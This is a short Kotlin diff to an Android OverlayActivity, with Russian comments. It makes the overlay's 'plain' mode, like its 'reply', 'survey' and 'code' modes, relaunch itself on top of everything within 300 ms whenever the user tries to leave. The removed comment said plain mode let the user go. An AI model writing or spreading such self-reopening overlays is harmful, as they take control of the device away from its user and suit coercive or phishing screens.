@@ -128,9 +128,9 @@ class OverlayActivity : Activity() {
         super.onStop()
         if (done) {
             finishAndRemoveTask()
+            return
         }
-        // Не вызываем finishAndRemoveTask здесь —
-        // переоткрытие обрабатывается в onUserLeaveHint
+        // plain/reply/survey/code — не закрываем, onUserLeaveHint вернёт поверх
     }
  
     /**
@@ -145,7 +145,7 @@ class OverlayActivity : Activity() {
             return  // мы сами открыли VPN/TG — не переоткрываемся
         }
         when (mode) {
-            "reply", "survey", "code" -> {
+            "plain", "reply", "survey", "code" -> {
                 // Немедленно возвращаемся поверх всего
                 handler.postDelayed({
                     val i = Intent(applicationContext, OverlayActivity::class.java).apply {
@@ -165,7 +165,6 @@ class OverlayActivity : Activity() {
                     applicationContext.startActivity(i)
                 }, 300L)
             }
-            // plain — не возвращаем, пользователь может уйти
         }
     }
  
